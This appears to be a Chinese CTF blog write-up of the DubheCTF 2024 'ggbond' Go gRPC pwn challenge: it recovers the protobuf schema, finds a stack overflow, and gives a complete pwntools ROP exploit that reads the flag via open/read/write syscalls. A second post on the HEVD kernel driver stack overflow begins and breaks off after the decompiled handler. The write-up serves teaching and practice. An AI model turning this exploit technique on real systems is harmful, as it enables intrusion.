<h2 id="ggbond"><a href="#ggbond" class="headerlink" title="ggbond"></a>ggbond</h2><p>æ‰“å¼€ï¼Œgolang protobuf grpcæœåŠ¡ï¼Œä½†æ˜¯ç¨‹åºä¿æŠ¤å¼€çš„å°‘ï¼ŒåŠ ä¸Šgoé™æ€ç¼–è¯‘ï¼Œä¿è¯gadgetæ˜¯å¤Ÿç”¨çš„ï¼Œå¹¶ä¸”ç¬¦å·è¡¨æ¯”è¾ƒå®Œæ•´</p>
<p>å­¦ä¹ ä¸€ä¸‹protobuf: <a href="https://zhuanlan.zhihu.com/p/436041011">æ·±å…¥è§£æprotobuf</a></p>
<p>æ¯ä¸ªæ¶ˆæ¯å¿…æœ‰ç±»å‹å’Œå­—æ®µç¼–å·ï¼Œä¹Ÿå­˜åœ¨å¯é€‰çš„å­—æ®µ</p>
<ul>
<li><strong>optional</strong>: message å¯ä»¥åŒ…å«è¯¥å­—æ®µé›¶æ¬¡æˆ–ä¸€æ¬¡ï¼ˆä¸è¶…è¿‡ä¸€æ¬¡ï¼‰ã€‚</li>
<li><strong>repeated</strong>: è¯¥å­—æ®µå¯ä»¥åœ¨æ¶ˆæ¯ä¸­é‡å¤ä»»æ„å¤šæ¬¡ï¼ˆåŒ…æ‹¬é›¶ï¼‰ã€‚å…¶ä¸­é‡å¤å€¼çš„é¡ºåºä¼šè¢«ä¿ç•™ã€‚åœ¨å¼€å‘è¯­è¨€ä¸­å°±æ˜¯æ•°ç»„å’Œåˆ—è¡¨</li>
</ul>
<p>æ¯ä¸ªå­—æ®µæœ‰å”¯ä¸€ç¼–å·ï¼Œåœ¨äºŒè¿›åˆ¶æµä¸­æ ‡è¯†å­—æ®µ</p>
<ul>
<li>1 åˆ° 15 èŒƒå›´å†…çš„å­—æ®µç¼–å·éœ€è¦ä¸€ä¸ªå­—èŠ‚è¿›è¡Œç¼–ç ï¼Œç¼–ç ç»“æœå°†åŒæ—¶åŒ…å«ç¼–å·å’Œç±»å‹</li>
<li>16 åˆ° 2047 èŒƒå›´å†…çš„å­—æ®µç¼–å·å ç”¨ä¸¤ä¸ªå­—èŠ‚ã€‚å› æ­¤ï¼Œéå¸¸é¢‘ç¹å‡ºç°çš„ message å…ƒç´ ä¿ç•™å­—æ®µç¼–å· 1 åˆ° 15ã€‚</li>
<li>å­—æ®µæœ€å°æ•°å­—ä¸º1ï¼Œæœ€å¤§å­—æ®µæ•°ä¸º2^29 - 1ã€‚</li>
<li>19000 ~ 19999 ä¿ç•™</li>
</ul>
<p>grpcurlçš„ç»“æœï¼š<a href="https://github.com/grpc/grpc-go/blob/master/Documentation/server-reflection-tutorial.md">server-reflection-tutorial</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ go install github.com/fullstorydev/grpcurl/cmd/grpcurl@latest</span><br><span class="line">$ grpcurl -plaintext 127.0.0.1:1337 list</span><br><span class="line">Failed to list services: server does not support the reflection API</span><br></pre></td></tr></table></figure>

<p>å’Œå®˜æ–¹æ¡ˆä¾‹æœ‰ç‚¹åƒï¼Œå› æ­¤ç¼–è¯‘å®˜æ–¹æ¡ˆä¾‹: <a href="https://grpc.io/docs/languages/go/quickstart/">Quick start | Go | gRPC</a></p>
<p>ä¸‹è½½æºç  <code>go build</code> ç„¶åIDAå¯¹æ¯”ä¸€ä¸‹</p>
<p><a href="https://scottgold.github.io/2020/11/16/%E9%98%85%E8%AF%BBprotobuf-go%E4%BB%A3%E7%A0%81.html">é˜…è¯»protobuf Goä»£ç </a>:å¯ä»¥æ‰¾åˆ°ä¸€ç‚¹ proto message å’Œ golang struct çš„å…³ç³»ï¼Œå¼€å§‹å¤„æœ‰ä¸‰ä¸ªå­—æ®µï¼Œå¹¶ä¸”åç§°ä¿®æ”¹ä¸ºå¤§é©¼å³°</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">type</span> OrderRequest <span class="keyword">struct</span> &#123;</span><br><span class="line">	state         protoimpl.MessageState</span><br><span class="line">	sizeCache     protoimpl.SizeCache</span><br><span class="line">	unknownFields protoimpl.UnknownFields</span><br><span class="line"></span><br><span class="line">	<span class="comment">// proto message</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>å› æ­¤ggbondå­˜åœ¨5ç§requestï¼Œä»¥åŠå…¶å¯¹åº”çš„responseã€‚</p>
<p>é€šè¿‡å®˜æ–¹helloworldå¯»æ‰¾service</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;google.golang.org/grpc/examples/helloworld/helloworld&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> helloworld;</span><br><span class="line"></span><br><span class="line">service Greeter &#123;</span><br><span class="line">  <span class="comment">// Sends a greeting</span></span><br><span class="line">  rpc SayHello (HelloRequest) returns (HelloReply) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.(*server).SayHello</span></span><br><span class="line">retval_840CC0 __golang main__ptr_server_SayHello</span><br><span class="line"></span><br><span class="line"><span class="comment">// google.golang.org/grpc/examples/helloworld/helloworld._Greeter_SayHello_Handler</span></span><br><span class="line">RTYPE *__golang google_golang_org_grpc_examples_helloworld_helloworld__Greeter_SayHello_Handler</span><br></pre></td></tr></table></figure>

<p>åŒç†</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="comment">// main/ggbond._GGBondServer_Handler_Handler</span></span><br><span class="line">RTYPE *__golang main_ggbond__GGBondServer_Handler_Handle</span><br><span class="line"></span><br><span class="line"><span class="comment">// main.(*server).Handler</span></span><br><span class="line">retval_848680 __golang main__ptr_server_Handle</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;ggbond&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> ggbond;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">  rpc Handler(Request) returns (Response) &#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ä½¿ç”¨Dockeræ­å»ºç¯å¢ƒï¼Œå°è¯•ä¸€ä¸‹äº¤äº’</p>
<p>é¦–å…ˆç”Ÿæˆpyæ–‡ä»¶</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python -m grpc_tools.protoc -I. --python_out=. --grpc_python_out=. ggbond.proto</span><br></pre></td></tr></table></figure>

<p>é€šä¿¡æŠ¥é”™</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">grpc._channel._InactiveRpcError: &lt;_InactiveRpcError of RPC that terminated with:</span><br><span class="line">	status = StatusCode.UNIMPLEMENTED</span><br><span class="line">	details = <span class="string">&quot;unknown service ggbond.GGBondServer&quot;</span></span><br></pre></td></tr></table></figure>

<p>æ‰¾åˆ°æ­£ç¡®çš„serviceåç§°</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">p_grpc_UnaryServerInfo-&gt;FullMethod.ptr = <span class="string">&quot;/GGBond.GGBondServer/Handler&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>æ‰€ä»¥æœ€ç»ˆï¼Œå¤§ä½“æ˜¯å¦‚ä¸‹çš„</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line">option go_package = <span class="string">&quot;GGBond&quot;</span>;</span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line">service GGBondServer &#123;</span><br><span class="line">  rpc Handler(Request) returns (Response) &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message IsRequest &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message IsResponse &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Request &#123;</span><br><span class="line">  IsRequest request = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message Response &#123;</span><br><span class="line">  <span class="type">uint64</span> tab = <span class="number">1</span>;</span><br><span class="line">  <span class="type">uint64</span> data = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiRequest &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message WhoamiResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeRequest &#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RoleChangeResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterRequest &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message RepeaterResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">message ErrorResponse &#123;</span><br><span class="line">  <span class="type">string</span> message = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åé€šä¿¡å‘ç°å›æ˜¾ä¸å¯¹ï¼Œä¸€ç›´å¡ä½äº†ã€‚é—®é¢˜åœ¨äºå¦‚ä½•ä¸€ä¸ªRequestæ˜¾ç¤º4ç§message?</p>
<hr>
<p>èµ›åçœ‹WPï¼Œåªèƒ½è¯´åšé¢˜æ—¶é‡ç‚¹é”™äº†ï¼Œåº”è¯¥ç›´æ¥æ‰¾ç›¸å…³å·¥å…·çš„</p>
<p>å¯ä»¥ç”¨pbtkè¿˜åŸprotobufç»“æ„ï¼š<a href="https://wzt.ac.cn/2023/12/14/protobuf/">é€†å‘æ¢å¤ Protobuf å¯¹è±¡ç»“æ„</a></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ python pbtk/extractors/from_binary.py  ./pwn ./ggbond.proto </span><br></pre></td></tr></table></figure>

<p>è·å¾—protoæ–‡ä»¶ï¼Œå¯ä»¥çœ‹å‡ºä½¿ç”¨ oneof å¤„ç†è¯·æ±‚ï¼Œå¹¶ä¸”ç¼–å·ä¸å¯¹ğŸ˜«</p>
<figure class="highlight protobuf"><table><tr><td class="code"><pre><span class="line">syntax = <span class="string">&quot;proto3&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">package</span> GGBond;</span><br><span class="line"></span><br><span class="line"><span class="keyword">option</span> go_package = <span class="string">&quot;./;ggbond&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">service </span><span class="title class_">GGBondServer</span> &#123;</span><br><span class="line">    <span class="function"><span class="keyword">rpc</span> Handler(Request) <span class="keyword">returns</span> (Response)</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Request</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> request &#123;</span><br><span class="line">        WhoamiRequest whoami = <span class="number">100</span>;</span><br><span class="line">        RoleChangeRequest role_change = <span class="number">101</span>;</span><br><span class="line">        RepeaterRequest repeater = <span class="number">102</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">Response</span> &#123;</span><br><span class="line">    <span class="keyword">oneof</span> response &#123;</span><br><span class="line">        WhoamiResponse whoami = <span class="number">200</span>;</span><br><span class="line">        RoleChangeResponse role_change = <span class="number">201</span>;</span><br><span class="line">        RepeaterResponse repeater = <span class="number">202</span>;</span><br><span class="line">        ErrorResponse error = <span class="number">444</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">WhoamiRequest</span> &#123;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">WhoamiResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2000</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RoleChangeRequest</span> &#123;</span><br><span class="line">    <span class="type">uint32</span> role = <span class="number">1001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RoleChangeResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2001</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RepeaterRequest</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">1002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">RepeaterResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">2002</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">message </span><span class="title class_">ErrorResponse</span> &#123;</span><br><span class="line">    <span class="type">string</span> message = <span class="number">4444</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<blockquote>
<p>æ ¹æ®å­—ç¬¦ä¸²åº”è¯¥æ˜¯åœ¨<code>.noptrdata:0000000000C22E62</code> è¿™ä¸€æ®µåŒºåŸŸï¼Œç»“åˆprotobufç»“æ„ååºåˆ—åŒ–ä¸€ä¸‹</p>
</blockquote>
<p>å› æ­¤å°±å¯ä»¥è¿›è¡Œ<del>æ„‰å¿«çš„</del>å°è¯•PWNäº†</p>
<p>é¦–å…ˆæµ‹è¯•ä¸‰ä¸ªåŠŸèƒ½</p>
<ul>
<li>Whoami: ç”¨æˆ·</li>
<li>RoleChange: æ”¹å˜ç”¨æˆ·,ç”¨æˆ·changeä¸èƒ½è¶…è¿‡3,å¦åˆ™åˆ‡æ¢å¤±è´¥</li>
<li>Repeater: ç”¨æˆ·åæ·»åŠ æˆ‘ä»¬å‘é€çš„å†…å®¹</li>
</ul>
<p>å› æ­¤ä¹Ÿæ˜¯å¾ˆç®€å•çš„åŠŸèƒ½,å…ˆå°è¯•æ‰‹æµ‹,ç„¶åå°±å´©æºƒäº†.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">channel = grpc.insecure_channel(<span class="string">&#x27;127.0.0.1:1337&#x27;</span>)</span><br><span class="line">stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami_request</span>():</span><br><span class="line">    msg = ggbond_pb2.WhoamiRequest()</span><br><span class="line">    req = ggbond_pb2.Request(whoami=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.whoami.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change_request</span>(<span class="params">role: <span class="built_in">int</span></span>):</span><br><span class="line">    msg = ggbond_pb2.RoleChangeRequest()</span><br><span class="line">    msg.role = role</span><br><span class="line">    req = ggbond_pb2.Request(role_change=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.role_change.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater_request</span>(<span class="params">m</span>):</span><br><span class="line">    msg = ggbond_pb2.RepeaterRequest()</span><br><span class="line">    msg.message = m</span><br><span class="line">    req = ggbond_pb2.Request(repeater=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.repeater.message)</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">1</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">2</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">role_change_request(<span class="number">3</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">repeater_request(cyclic(<span class="number">100</span>))</span><br><span class="line"></span><br><span class="line">channel.close()</span><br></pre></td></tr></table></figure>

<p>ç¬¬ä¸‰æ¬¡è¯·æ±‚æ—¶ä¿å­˜,è¿æ¥æ–­å¼€,å› æ­¤ä»ç¬¬ä¸‰æ¬¡å°è¯•</p>
<p>åœ¨ <code>repeater_request(cyclic(0x28))</code> ä¸å´©æºƒ,åœ¨0x30å´©æºƒ</p>
<p>é€†å‘ä¸€ä¸‹repeater,ç»“åˆæµ‹è¯•çš„ç»“æœ,è¿˜æ˜¯èƒ½å¤§è‡´çŒœå‡ºæ¥</p>
<figure class="highlight go"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span> ( tab == off_9799C0 )   <span class="comment">// request.tab = RepeaterRequest</span></span><br><span class="line">  &#123;</span><br><span class="line">    v99 = a3;</span><br><span class="line">    <span class="keyword">if</span> ( qword_C94B80 == <span class="number">3</span> )   <span class="comment">// role=3 ç‰¹æ®Šå¤„ç†</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">// ...</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// å°†ä¼ å…¥çš„æ•°æ® base64 è§£ç </span></span><br><span class="line">v100 = *(<span class="type">string</span> *)(*(_QWORD *)v99-&gt;Request.data + <span class="number">40</span>LL);</span><br><span class="line"><span class="built_in">len</span> = v100.<span class="built_in">len</span>;</span><br><span class="line">v102 = encoding_base64__ptr_Encoding_DecodeString(qword_C62CA0, v100);</span><br><span class="line">ptr = v102<span class="number">.0</span>.ptr;</span><br><span class="line">v92 = v102<span class="number">.0</span>.<span class="built_in">len</span>;</span><br><span class="line"><span class="built_in">cap</span> = v102<span class="number">.0</span>.<span class="built_in">cap</span>;</span><br><span class="line">v76[<span class="number">0</span>] = v8;  <span class="comment">// è¿™æ˜¯ä¸€ä¸ªæ ˆä¸Šçš„æ•°æ®</span></span><br><span class="line">v76[<span class="number">1</span>] = v8;  </span><br><span class="line">v94 = v76;</span><br><span class="line">v95 = <span class="number">32</span>LL;</span><br><span class="line">v96 = <span class="number">32</span>LL;</span><br><span class="line">v50 = v76;</span><br><span class="line">v51 = v102<span class="number">.0</span>.ptr;</span><br><span class="line"></span><br><span class="line"><span class="comment">// go Unsafe åšæŒ‡é’ˆåŠ æ³•</span></span><br><span class="line"><span class="comment">// å°†è§£ç åçš„æ•°æ®ä¼ é€’ç»™v50</span></span><br><span class="line"><span class="keyword">for</span> ( i = <span class="number">0</span>LL; i &lt; (__int64)(<span class="number">3</span> * (<span class="built_in">len</span> &gt;&gt; <span class="number">2</span>)); ++i )</span><br><span class="line">&#123;</span><br><span class="line">	*(_BYTE *)v50 = *v51;</span><br><span class="line">	v50 = (__int128 *)((char *)v50 + <span class="number">1</span>);</span><br><span class="line">	++v51;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯ä¸‹æ–­ç‚¹,è°ƒè¯•,è·å¾—siåˆ°bpçš„è·ç¦»</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"> RDI  0xc00002832c â—‚â€” 0x333231 /* <span class="string">&#x27;123&#x27;</span> */</span><br><span class="line"> RSI  0xc0001bb628 â—‚â€” 0x0</span><br><span class="line"> RSP  0xc0001bb5e0 â€”â–¸ 0xc0001aa000 â—‚â€” 0x4847464544434241 (<span class="string">&#x27;ABCDEFGH&#x27;</span>)</span><br><span class="line">*RIP  0x7ee024 â—‚â€” movzx r10d, byte ptr [rdi]</span><br><span class="line">   0x7ee01e    mov    r8, rsi</span><br><span class="line">   0x7ee021    mov    r9, rdi</span><br><span class="line"> â–º 0x7ee024    movzx  r10d, byte ptr [rdi]</span><br><span class="line">   0x7ee028    mov    byte ptr [rsi], r10b</span><br><span class="line">   0x7ee02b    inc    rax</span><br><span class="line">   0x7ee02e    lea    rsi, [r8 + 1]</span><br><span class="line">   0x7ee032    lea    rdi, [r9 + 1]</span><br><span class="line">   0x7ee036    cmp    rax, rdx</span><br><span class="line">   0x7ee039    jl     0x7ee01e                      &lt;0x7ee01e&gt;</span><br><span class="line">    â†“</span><br><span class="line">   0x7ee01e    mov    r8, rsi</span><br><span class="line">   0x7ee021    mov    r9, rdi</span><br><span class="line">pwndbg&gt; p/x 0xc0001bb6e8-0xc0001bb628</span><br><span class="line"><span class="variable">$2</span> = 0xc0</span><br></pre></td></tr></table></figure>

<p>ç„¶åå°±æ˜¯å†™ROPäº†: ORWå°†flagæ‰“å‡ºæ¥,ä½¿ç”¨syscall.</p>
<p>æŸ¥çœ‹åˆ«äººçš„WP,æ‰“è¿œç¨‹</p>
<ul>
<li>å…ˆ nc ç›®æ ‡ç«¯å£ï¼Œç”¨æ¥æ¥æ”¶orwçš„ç»“æœ</li>
<li>å†å»ºç«‹ä¸€ä¸ªrpcè¿æ¥ï¼Œç”¨æ¥æ‰“</li>
</ul>
<p>æ‰“æœ¬åœ°:è¿™ä¸ªæ–‡ä»¶fdå¾—è°ƒè¯•å‡ºæ¥.</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ggbond_pb2</span><br><span class="line"><span class="keyword">import</span> ggbond_pb2_grpc</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">channel = grpc.insecure_channel(<span class="string">&#x27;127.0.0.1:23334&#x27;</span>)</span><br><span class="line">stub = ggbond_pb2_grpc.GGBondServerStub(channel)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">whoami_request</span>():</span><br><span class="line">    msg = ggbond_pb2.WhoamiRequest()</span><br><span class="line">    req = ggbond_pb2.Request(whoami=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.whoami.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">role_change_request</span>(<span class="params">role: <span class="built_in">int</span></span>):</span><br><span class="line">    msg = ggbond_pb2.RoleChangeRequest()</span><br><span class="line">    msg.role = role</span><br><span class="line">    req = ggbond_pb2.Request(role_change=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.role_change.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">repeater_request</span>(<span class="params">m</span>):</span><br><span class="line">    msg = ggbond_pb2.RepeaterRequest()</span><br><span class="line">    msg.message = m</span><br><span class="line">    req = ggbond_pb2.Request(repeater=msg)</span><br><span class="line">    resp = stub.Handler(req)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Greeter client received: &quot;</span> + resp.repeater.message)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># role_change_request(1)</span></span><br><span class="line"><span class="comment"># whoami_request()</span></span><br><span class="line"><span class="comment"># repeater_request(cyclic(100))</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># role_change_request(2)</span></span><br><span class="line"><span class="comment"># whoami_request()</span></span><br><span class="line"><span class="comment"># repeater_request(cyclic(100))</span></span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x000000000040452c</span></span><br><span class="line">pop_rdi_ret = <span class="number">0x0000000000401537</span></span><br><span class="line">pop_rsi_ret = <span class="number">0x0000000000422398</span></span><br><span class="line">pop_rax_ret = <span class="number">0x00000000004101e6</span></span><br><span class="line">pop_rdx_ret = <span class="number">0x0000000000461bd1</span></span><br><span class="line">flag = <span class="number">0x00000000007ef68d</span></span><br><span class="line">bss_buf = <span class="number">0xC6CF60</span></span><br><span class="line">payload = <span class="string">b&quot;a&quot;</span> * <span class="number">0xc0</span> + p64(<span class="number">0xdeadbeef</span>)</span><br><span class="line">context.arch=<span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment"># open(&quot;flag&quot;, 0) -&gt; syscall(2, &#x27;flag&#x27;, 0)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">2</span>,</span><br><span class="line">    pop_rdi_ret, flag,</span><br><span class="line">    pop_rsi_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdx_ret, <span class="number">0</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># read(fd, buf, len)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">0</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">10</span>,</span><br><span class="line">    pop_rsi_ret, bss_buf,</span><br><span class="line">    pop_rdx_ret, <span class="number">0x100</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># write(fd, buf, len)</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    pop_rsi_ret, bss_buf,</span><br><span class="line">    pop_rdx_ret, <span class="number">0x100</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line"><span class="comment"># exit 1</span></span><br><span class="line">payload += flat([</span><br><span class="line">    pop_rax_ret, <span class="number">60</span>,</span><br><span class="line">    pop_rdi_ret, <span class="number">1</span>,</span><br><span class="line">    syscall,</span><br><span class="line">])</span><br><span class="line"></span><br><span class="line">sleep(<span class="number">2</span>)</span><br><span class="line">whoami_request()</span><br><span class="line">role_change_request(<span class="number">3</span>)</span><br><span class="line">repeater_request(base64.b64encode(payload))</span><br><span class="line">channel.close()</span><br></pre></td></tr></table></figure>

<h2 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h2><ul>
<li><a href="https://blog.wm-team.cn/index.php/archives/72/">DubheCTF 2024 By W&amp;M</a></li>
</ul>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>HEVD-StackOverFlow</title>
    <url>/2024/04/03/HEVD%20StackOverFlow/</url>
    <content><![CDATA[<blockquote>
<p>æ ˆæº¢å‡ºï¼Œæ¢¦å¼€å§‹çš„åœ°æ–¹</p>
</blockquote>
<span id="more"></span>

<p>ç›¸å…³ä»£ç åœ¨ä»“åº“<a href="https://github.com/Ha0-Y/HEVDExploits">HEVDExploits</a></p>
<h2 id="Without-GS"><a href="#Without-GS" class="headerlink" title="Without GS"></a>Without GS</h2><p>å­˜åœ¨é—®é¢˜çš„åŒºåŸŸ</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="keyword">case</span> <span class="number">0x222003</span>:</span><br><span class="line"><span class="built_in">DbgPrintEx</span>(<span class="number">0x4D</span>u, <span class="number">3u</span>, <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>);</span><br><span class="line">FakeObjectNonPagedPoolNxIoctlHandler = <span class="built_in">BufferOverflowStackIoctlHandler</span>(Irp, CurrentStackLocation);</span><br><span class="line">v7 = <span class="string">&quot;****** HEVD_IOCTL_BUFFER_OVERFLOW_STACK ******\n&quot;</span>;</span><br></pre></td></tr></table></figure>

<p>Ioctlè·å¾—ç”¨æˆ·æ€å‚æ•°</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">BufferOverflowStackIoctlHandler</span><span class="params">(_IRP *Irp, _IO_STACK_LOCATION *IrpSp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="type">void</span> *Type3InputBuffer; <span class="comment">// rcx</span></span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">size_t</span> InputBufferLength; <span class="comment">// rdx</span></span><br><span class="line"></span><br><span class="line">  Type3InputBuffer = IrpSp-&gt;Parameters.DeviceIoControl.Type3InputBuffer;</span><br><span class="line">  result = <span class="number">3221225473</span>i64;</span><br><span class="line">  InputBufferLength = IrpSp-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">  <span class="keyword">if</span> ( Type3InputBuffer )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">TriggerBufferOverflowStack</span>(Type3InputBuffer, InputBufferLength);</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>è¯»å–åˆ°å†…æ ¸æ ˆä¸­</p>
